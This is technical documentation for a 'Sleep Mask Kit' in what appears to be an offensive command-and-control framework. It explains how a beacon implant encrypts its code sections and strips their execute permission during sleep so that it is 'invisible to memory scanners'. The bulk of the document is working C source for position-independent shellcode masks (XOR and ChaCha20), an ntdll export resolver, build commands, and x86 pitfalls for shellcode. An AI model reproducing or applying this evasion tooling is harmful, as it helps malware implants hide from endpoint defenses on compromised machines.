Sleep Mask Kit

Sleep Mask Kit allows replacing the beacon's built-in sleep logic with a custom PIC shellcode blob. While sleeping the beacon encrypts its executable sections, changes their protection to RW, and performs the delay. This makes the beacon invisible to memory scanners.

Architecture

The beacon PE has special sections for sleep obfuscation:

SectionContentsEncrypted during sleep?
.textBeacon code (tasking, commands, crypto)Yes
.rdataConstants, import tablesYes
.sleepTrampoline (masked_sleep, NT function resolution)No
.slpmskSlot for the custom shellcode (8192 bytes)No
.co2cfgBeaconState (configuration)No

Execution Flow

beacon_run()
  +-- masked_sleep(ms)                     [.sleep section]
       |-- find_self_base()                VirtualQuery -> module base
       |-- Walk PE sections -> regions[]   (only .text, .rdata)
       |-- bc_random(key, 16)              generate XOR key
       |-- Resolve NtProtectVirtualMemory, NtDelayExecution, etc.
       |-- IF .slpmsk patched:
       |       [4-byte EP offset] -> call user mask blob
       |   ELSE:
       |       call default_mask() (built-in XOR + NtDelayExecution)
       +-- Zero key, return

Blob Format (.slpmsk)

The blob is the extracted .text section of the compiled mask with a 4-byte header:

[uint32_t LE: offset from blob start to entry point]
[... entire .text section code ...]

Since the linker uses /MERGE:.rdata=.text, all data (strings, tables) is merged into .text before the code. The entry point is usually not at zero offset — the header specifies the exact offset.

Maximum blob size: 8176 bytes (8192 - 16 bytes for the sentinel). If the compiled mask exceeds this size, artifact-gen will refuse to patch.

API (SleepMaskCtx)

The trampoline fills the SleepMaskCtx structure and passes a pointer to it into the mask. Definition in kit/sleepmask/sleep_mask_api.h:

SleepRegion

typedef struct SleepRegion {
    void*    base;           // virtual address of the region
    uint32_t size;           // size in bytes
    uint32_t original_prot;  // original PAGE_* protection
} SleepRegion;

SleepMaskCtx

typedef struct SleepMaskCtx {
    // ---- Regions to encrypt ----
    SleepRegion regions[16];   // .text, .rdata (filled by the trampoline)
    uint32_t    region_count;  // number of filled elements

    // ---- Crypto material ----
    uint8_t     key[16];       // random 16-byte key (new each cycle)

    // ---- Sleep parameters ----
    uint32_t    sleep_ms;      // delay in milliseconds
    uint8_t     jitter_pct;    // jitter percentage (0-99)
    uint8_t     _pad[3];

    // ---- Pointers to NT functions (from ntdll.dll) ----
    NTSTATUS (*NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS (*NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER Delay);
    NTSTATUS (*NtWaitForSingleObject)(HANDLE, BOOL, PLARGE_INTEGER);

    // ---- Kernel32 ----
    BOOL (*FlushInstructionCache)(HANDLE hProcess, const void*, SIZE_T);

    // ---- Auxiliary ----
    HANDLE  process_handle;    // pseudo-handle (HANDLE)-1
    void*   ntdll_base;        // ntdll.dll base (for resolving additional functions)
} SleepMaskCtx;

Mask Contract

The custom code must perform the following sequence:

  1. Change protection to RW — NtProtectVirtualMemory(..., PAGE_READWRITE, ...) for each region. Removes Execute — a scanner will not see executable beacon code.
  2. Encrypt regions — XOR, ChaCha20, AES, or any symmetric algorithm. Key: ctx->key[16] (or derived from it).
  3. Perform the delay — NtDelayExecution, NtWaitForSingleObject, timer-queue APC, or another wait mechanism.
  4. Decrypt regions — the same operation in reverse order.
  5. Restore protection — return original_prot for each region.
  6. FlushInstructionCache — flush the instruction cache.
FORBIDDEN to call any beacon functions — its .text section is encrypted while the mask is executing! All required functions must be resolved via ctx->ntdll_base or obtained from ctx.

PIC Code Rules

  • No global variables or static data.
  • No string literals ("NtCreateEvent") — only stack-allocated character arrays.
  • No CRT (malloc, printf, memcpy, etc.).
  • Entry point sleep_mask_entry must be the first defined function in the file.
  • All helper functions are defined after the entry point.
  • Calling convention: __cdecl.
  • Maximum compiled code size: 8176 bytes.

Build

Automated (build_all.bat)

cd kit\sleepmask
build_all.bat

The script compiles all masks from masks\ + default_mask.c for x64 and x86. Output: bin\<name>.x64.bin and bin\<name>.x86.bin.

Manual Build of a Single Mask

REM x64:
cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /I"kit\sleepmask" ^
    /Fo"mask.obj" my_mask.c
link.exe /nologo /NODEFAULTLIB /ENTRY:sleep_mask_entry ^
    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
    /OUT:mask.exe mask.obj
python kit\sleepmask\extract_section.py mask.exe .text mask.x64.bin

REM x86 (add /arch:IA32 and link x86_helpers.obj):
cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /arch:IA32 /I"kit\sleepmask" ^
    /Fo"mask.obj" my_mask.c
cl.exe /nologo /c /O2 /GS- /Zl /TC /Fo"helpers.obj" ^
    kit\sleepmask\x86_helpers.c
link.exe /nologo /NODEFAULTLIB /ENTRY:sleep_mask_entry ^
    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
    /OUT:mask.exe mask.obj helpers.obj
python kit\sleepmask\extract_section.py mask.exe .text mask.x86.bin

Writing a Custom Mask

Template

#include "sleep_mask_api.h"

// Helper functions (forward declarations).
static int   pic_strcmp(const char* a, const char* b);
static void* pic_get_proc(void* module_base, const char* func_name);

// ---- ENTRY POINT (must be the FIRST function in the file) ----
void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // 1. Protection -> RW
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz, 0x04, &old_prot);
    }

    // 2. Encrypt
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 3. Delay
    {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        ctx->NtDelayExecution(FALSE, &delay);
    }

    // 4. Decrypt (XOR is symmetric)
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 5. Restore protection
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // 6. Flush
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
}

// ---- Helper functions (AFTER entry point) ----
// ...

Resolving Additional NT Functions

If functions not included in SleepMaskCtx are needed (e.g. NtCreateEvent, NtClose), they can be obtained by parsing the ntdll export directory at address ctx->ntdll_base:

// Stack strings (PIC!) -- NOT literals!
char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};

// Resolve via pic_get_proc (PE export table parsing)
typedef NTSTATUS (__stdcall *pfn_NtCreateEvent)(HANDLE*, DWORD, void*, int, BOOL);
pfn_NtCreateEvent NtCreateEvent =
    (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);

pic_get_proc Implementation

The standard implementation used in all kit masks:

static int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void* pic_get_proc(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* exp_dir =
        &nt->OptionalHeader.DataDirectory[0]; // IMAGE_DIRECTORY_ENTRY_EXPORT
    if (!exp_dir->VirtualAddress) return 0;
    IMAGE_EXPORT_DIRECTORY* exp =
        (IMAGE_EXPORT_DIRECTORY*)(base + exp_dir->VirtualAddress);
    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
            return (void*)(base + funcs[ordinals[i]]);
    }
    return 0;
}

x86 Pitfalls

On x64, code is inherently position-independent (RIP-relative addressing). On x86, MSVC generates absolute addresses, which breaks PIC shellcode. Three main problems:

1. String Literals

On x86 a string "NtCreateEvent" is placed in .rdata, and the reference to it is push 0x004010xx (absolute address). When the shellcode is loaded at a different address this pointer is invalid.

Solution: declare all strings as character arrays on the stack:

// WRONG (breaks on x86):
void* p = pic_get_proc(base, "NtCreateEvent");

// CORRECT (PIC on any architecture):
char s[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
void* p = pic_get_proc(base, s);

2. SSE Instructions with Absolute Addresses

MSVC uses SSE2 by default for stack array initialization: movaps xmm0, [0x00401000] — loads a 16-byte template from .rdata at an absolute address.

Solution: compile x86 masks with the /arch:IA32 flag, which completely disables SSE instructions. All operations use x87/ALU.

3. 64-bit Multiplication (__allmul)

The expression -(LONGLONG)sleep_ms * 10000LL on x86 generates a call to __allmul — an internal CRT function for 64-bit multiplication. This function must be available at call time.

For PIC blobs: during linking x86_helpers.obj is included (contains __allmul, __allshr, __aullshr). The code ends up in the blob's .text and works correctly.

For the beacon's built-in mask: __allmul resides in the .text section of the beacon. If the mask encrypted .text before computing the delay — calling __allmul will crash. Therefore all 64-bit operations must be performed BEFORE encryption.

// CORRECT: compute delay BEFORE encryption
LARGE_INTEGER delay;
delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;  // calls __allmul

// ... then encrypt ...
xor_encrypt(regions);

// ... sleep with the pre-computed value ...
ctx->NtDelayExecution(FALSE, &delay);

Example: Minimal Mask

File default_mask.c — the simplest working mask (XOR-16 + NtDelayExecution):

#include "sleep_mask_api.h"

void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // 1. RW
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz, 0x04, &old_prot);
    }

    // 2. XOR encrypt
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 3. Sleep
    {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        ctx->NtDelayExecution(FALSE, &delay);
    }

    // 4. XOR decrypt
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 5. Restore
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // 6. Flush
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
}

Example: ChaCha20 + NtWaitForSingleObject

File masks/chacha_sleep/mask.c demonstrates:

  • Using a full stream cipher (256-bit key derived from 16-byte seed)
  • Resolving additional functions from ntdll via pic_get_proc
  • Waiting via an unsignaled event (clean stack during scanning)
  • Zeroing crypto material after use
void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    // Key derivation: 16 -> 32 bytes key + 12 bytes nonce
    uint8_t key32[32];
    uint8_t nonce12[12];
    for (int k = 0; k < 16; ++k) {
        key32[k] = ctx->key[k];
        key32[16+k] = ctx->key[k] ^ 0xA5;
    }
    for (int k = 0; k < 12; ++k) nonce12[k] = ctx->key[k + 4];

    // Stack strings (PIC!)
    char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
    char s_nc[]  = {'N','t','C','l','o','s','e',0};

    // Resolve additional functions from ntdll
    pfn_NtCreateEvent NtCreateEvent =
        (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
    pfn_NtClose NtClose =
        (pfn_NtClose)pic_get_proc(ctx->ntdll_base, s_nc);

    // Create unsignaled event
    HANDLE hEvent = 0;
    int use_event = 0;
    if (NtCreateEvent && NtClose) {
        if (NtCreateEvent(&hEvent, 0x1F0003, 0, 1, FALSE) >= 0)
            use_event = 1;
    }

    // 1. RW
    // 2. ChaCha20 encrypt
    // 3. NtWaitForSingleObject (timeout = sleep_ms)
    // 4. ChaCha20 decrypt (same key + counter=0)
    // 5. Restore protection
    // 6. FlushInstructionCache + NtClose(hEvent)

    // Zero crypto material
    for (int k = 0; k < 32; ++k) key32[k] = 0;
    for (int k = 0; k < 12; ++k) nonce12[k] = 0;
}
Full ChaCha20 source code (embedded in the shellcode) is in kit/sleepmask/masks/chacha_sleep/mask.c. The implementation is self-contained — no external library dependencies.

Integration with the Beacon

How the Beacon Calls the Mask

  1. The masked_sleep(ms) function in the .sleep section is called from the beacon's main loop.
  2. The trampoline determines the module base via VirtualQuery.
  3. Walks the PE section table, selecting .text and .rdata (skips .sleep, .slpmsk, .co2cfg).
  4. Generates a random 16-byte key (bc_random).
  5. Resolves NT functions from ntdll (stack strings, no .rdata patterns).
  6. Checks the .slpmsk section:
    • If it contains the sentinel CO2H_SLPMASK_v1 — no mask is patched in, calls the built-in default_mask().
    • If the sentinel is overwritten — reads the 4-byte EP offset, jumps to g_slpmsk_slot + offset.
  7. After the mask returns — zeros the key, returns control to the beacon.

Sentinel Detection

Sentinel check is done byte-by-byte (without accessing .rdata) to prevent a false pattern match when /MERGE:.rdata=.text is used:

if (g_slpmsk_slot[0]  != 'C')  return 1; // patched
if (g_slpmsk_slot[1]  != 'O')  return 1;
...
if (g_slpmsk_slot[15] != '\0') return 1;
return 0;  // unpatched

Section Memory Layout

+------------------+
| .text            |  <-- encrypted by the mask
| .rdata           |  <-- encrypted by the mask
+------------------+
| .sleep           |  <-- NOT encrypted (trampoline + default_mask)
+------------------+
| .slpmsk          |  <-- NOT encrypted (custom PIC blob)
+------------------+
| .co2cfg          |  <-- NOT encrypted (BeaconState)
+------------------+
| .data, .bss      |  <-- NOT encrypted (global variables)
+------------------+
